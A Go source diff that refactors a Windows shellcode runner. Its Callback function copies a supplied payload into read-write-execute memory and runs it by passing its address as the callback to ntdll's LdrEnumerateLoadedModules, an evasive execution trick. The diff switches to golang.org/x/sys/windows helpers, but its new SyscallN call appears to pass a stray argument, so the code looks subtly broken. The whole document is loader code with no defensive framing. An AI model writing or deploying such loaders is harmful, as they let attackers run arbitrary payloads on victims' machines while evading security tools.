@@ -1,8 +1,8 @@
 package TT
 
 import (
-	"fmt"
-	"os"
+	"golang.org/x/sys/windows"
+	"log"
 	"syscall"
 	"unsafe"
 )
@@ -10,6 +10,7 @@ import (
 var (
 	g_InitOnce [0]byte
 	lpContext  [0]byte
+	hNtdll1    uintptr
 )
 
 const (
@@ -25,23 +26,51 @@ var (
 	VirtualAlloc     = kernel32.MustFindProc("VirtualAlloc")
 	GetModuleHandleW = kernel32.MustFindProc("GetModuleHandleW")
 	GetProcAddress   = kernel32.MustFindProc("GetProcAddress")
+	LoadLibraryA     = kernel32.MustFindProc("LoadLibraryA")
 	RtlMoveMemory    = ntdll.MustFindProc("RtlMoveMemory")
 )
+
+type UNICODE_STRING struct {
+	Length        uint16
+	MaximumLength uint16
+	Buffer        *uint16
+}
+
+type PUNICODE_STRING *UNICODE_STRING
+
+type PACTIVATION_CONTEXT unsafe.Pointer
+
+type LDR_DATA_TABLE_ENTRY struct {
+	InLoadOrderLinks            windows.LIST_ENTRY
+	InMemoryOrderLinks          windows.LIST_ENTRY
+	InInitializationOrderLinks  windows.LIST_ENTRY
+	DllBase                     unsafe.Pointer
+	EntryPoint                  unsafe.Pointer
+	SizeOfImage                 uint32
+	FullDllName                 UNICODE_STRING
+	BaseDllName                 UNICODE_STRING
+	Flags                       uint32
+	LoadCount                   uint16
+	TlsIndex                    uint16
+	HashLinks                   windows.LIST_ENTRY
+	SectionPointer              unsafe.Pointer
+	CheckSum                    uint32
+	TimeDateStamp               uint32
+	LoadedImports               unsafe.Pointer
+	EntryPointActivationContext PACTIVATION_CONTEXT
+	PatchInformation            unsafe.Pointer
+}
 
 func Callback(shellcode []byte) {
 	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
 	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
-
-	p1, _ := syscall.UTF16PtrFromString("ntdll")
-	hNtdll, _, _ := GetModuleHandleW.Call(uintptr(unsafe.Pointer(p1)))
-
-	p2, _ := syscall.UTF16PtrFromString("LdrEnumerateLoadedModules")
-	func1, _, err := GetProcAddress.Call(hNtdll, uintptr(unsafe.Pointer(&p2)))
-	if err.Error() == "The specified procedure could not be found." {
-		fmt.Println(err)
-		os.Exit(0)
+	hNtdll, err1 := windows.LoadLibrary("ntdll")
+	if err1 != nil {
+		log.Fatal(err1)
 	}
-	func2 := (*func(p1 uintptr, p2 uintptr, p3 uintptr))(unsafe.Pointer(func1))
-	LdrEnumerateLoadedModules := *func2
-	LdrEnumerateLoadedModules(NULL, addr, NULL)
+	LdrEnumerateLoadedModules, err := windows.GetProcAddress(hNtdll, "LdrEnumerateLoadedModules")
+	if err != nil {
+		log.Fatal(err)
+	}
+	syscall.SyscallN(LdrEnumerateLoadedModules, 3, NULL, addr, NULL)
 }
